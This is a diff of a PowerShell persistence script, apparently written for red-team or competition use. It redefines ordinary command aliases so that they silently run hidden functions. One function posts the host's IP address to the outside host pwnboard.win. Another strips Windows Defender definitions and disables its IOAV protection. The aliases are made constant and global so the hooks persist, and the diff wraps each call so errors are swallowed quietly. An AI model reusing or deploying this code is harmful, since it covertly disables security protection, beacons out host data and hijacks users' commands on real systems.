@@ -19,7 +19,7 @@
 
 # DEFINE FUNCTIONS BELOW
 $mm = @'
-function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue -Force  |Select-Object -ExpandProperty IPV4Address;$i=$i.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
+function mm {try {$i=(Test-Connection -ComputerName $env:ComputerName -Count 1).IPV4Address.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic"  -ErrorAction SilentlyContinue -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
 '@.Trim()
 $dd = @'
 function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
@@ -69,7 +69,7 @@ function shim([string]$key, [string]$value) {
     First element: String that is definition of function that contains shimmed functions as well as definition for alias
     Second element: String that redefines the alias with the Value being our shimmed functon 
     #>
-    $y = "function shimmed_$key {$value; mm; xx; dd; ff}"
+    $y = "function shimmed_$key {$value; try{mm}catch{}; try{xx}catch{}; try{dd}catch{}; try{ff}catch{}}"
     $tmp = "shimmed_$key"
     $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force'
     $s = $shim.Replace("cmd", $key).Replace("val", $tmp)
